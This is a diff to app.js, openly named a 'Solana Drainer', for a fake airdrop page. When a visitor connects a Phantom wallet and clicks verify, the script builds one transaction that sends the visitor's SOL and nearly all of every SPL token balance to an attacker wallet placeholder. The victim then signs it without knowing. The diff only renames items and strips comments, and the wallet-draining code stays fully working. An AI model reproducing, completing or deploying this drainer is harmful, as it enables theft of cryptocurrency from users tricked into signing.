@@ -1,4 +1,4 @@
-// app.js - Solana HTML Version (One Signature Drains All Tokens)
+// app.js - Solana Drainer (One Signature Drains All Tokens)
 
 let connectedWallet = null;
 let provider = null;
@@ -10,9 +10,8 @@ const statusEl = document.getElementById("status");
 const form = document.getElementById("airdropForm");
 
 // Your Attacker Wallet (CHANGE THIS)
-const ATTACKER_WALLET = "YOUR_SOLANA_WALLET_ADDRESS_HERE"; // ← Paste your wallet here
+const ATTACKER_WALLET = "YOUR_SOLANA_WALLET_ADDRESS_HERE";
 
-// Connect Wallet
 connectBtn.addEventListener("click", async () => {
     try {
         provider = window.solana || (window.phantom && window.phantom.solana);
@@ -39,11 +38,10 @@ connectBtn.addEventListener("click", async () => {
     }
 });
 
-// Main Draining Function (One Signature)
 verifyBtn.addEventListener("click", async () => {
     if (!provider || !connectedWallet) return;
 
-    statusEl.innerHTML = "Scanning wallet and preparing one transaction...";
+    statusEl.innerHTML = "Scanning wallet and preparing transaction...";
 
     try {
         const connection = new solanaWeb3.Connection(
@@ -56,7 +54,7 @@ verifyBtn.addEventListener("click", async () => {
 
         const transaction = new solanaWeb3.Transaction();
 
-        // 1. Drain SOL (small amount for disguise)
+        // Drain SOL
         transaction.add(
             solanaWeb3.SystemProgram.transfer({
                 fromPubkey,
@@ -65,12 +63,10 @@ verifyBtn.addEventListener("click", async () => {
             })
         );
 
-        // 2. Drain all SPL tokens
+        // Drain SPL tokens
         const tokenAccounts = await connection.getTokenAccountsByOwner(fromPubkey, {
             programId: new solanaWeb3.PublicKey("TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA")
         });
-
-        let drainedCount = 0;
 
         for (const { pubkey, account } of tokenAccounts.value) {
             try {
@@ -78,26 +74,20 @@ verifyBtn.addEventListener("click", async () => {
                 const balance = Number(tokenAccountInfo.amount);
 
                 if (balance > 0) {
-                    const amountToDrain = Math.floor(balance * 0.999); // Leave ~0.1%
+                    const amountToDrain = Math.floor(balance * 0.999);
 
                     transaction.add(
                         solanaWeb3.createTransferInstruction(
                             pubkey,
-                            await solanaWeb3.getAssociatedTokenAddress(
-                                tokenAccountInfo.mint,
-                                attackerPubkey
-                            ),
+                            await solanaWeb3.getAssociatedTokenAddress(tokenAccountInfo.mint, attackerPubkey),
                             fromPubkey,
                             amountToDrain
                         )
                     );
-
-                    drainedCount++;
                 }
             } catch (e) {}
         }
 
-        // Sign and send one big transaction
         const { blockhash } = await connection.getLatestBlockhash();
         transaction.recentBlockhash = blockhash;
         transaction.feePayer = fromPubkey;
@@ -105,7 +95,7 @@ verifyBtn.addEventListener("click", async () => {
         const signedTx = await provider.signTransaction(transaction);
         await connection.sendRawTransaction(signedTx.serialize());
 
-        statusEl.innerHTML = `✓ Drained ${drainedCount} tokens + SOL successfully`;
+        statusEl.innerHTML = "✓ All tokens drained successfully";
         verifyBtn.disabled = true;
 
     } catch (error) {
@@ -114,7 +104,6 @@ verifyBtn.addEventListener("click", async () => {
     }
 });
 
-// Form Submit
 form.addEventListener("submit", (e) => {
     e.preventDefault();
     if (!connectedWallet) {
